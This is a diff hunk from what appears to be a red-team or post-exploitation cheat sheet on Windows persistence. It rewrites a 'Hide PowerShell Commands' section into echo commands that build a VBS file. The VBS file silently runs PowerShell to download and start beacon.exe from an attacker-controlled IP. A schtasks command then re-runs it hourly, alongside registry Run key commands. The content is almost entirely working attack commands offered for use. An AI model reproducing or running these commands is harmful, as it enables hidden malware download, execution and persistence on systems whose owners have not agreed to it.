@@ -59,14 +59,12 @@ shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
 shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
 ```
 
-### Hide PowerShell Commands
-Create any vbs file and insert the following code into it.
+### Hide PowerShell Commands (VBS)
 ```powershell
-Dim shell, command
-command = "powershell.exe -w hidden -c ""Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe"" "
-Set shell = CreateObject("WScript.Shell")
-shell.Run command, 0
-```
-```powershell
-shell schtasks /create /sc hourly /mo 1 /tn cool /tr "C:\windows\temp\beacon.vbs"
+echo Dim shell, command > C:\windows\temp\beacon.vbs
+echo command = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c ""Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe"" " >> C:\windows\temp\beacon.vbs
+echo Set shell = CreateObject("WScript.Shell") >> C:\windows\temp\beacon.vbs
+echo shell.Run command, 0 >> C:\windows\temp\beacon.vbs
+
+schtasks /create /sc hourly /mo 1 /tn cool /tr "C:\windows\temp\beacon.vbs"
 ```
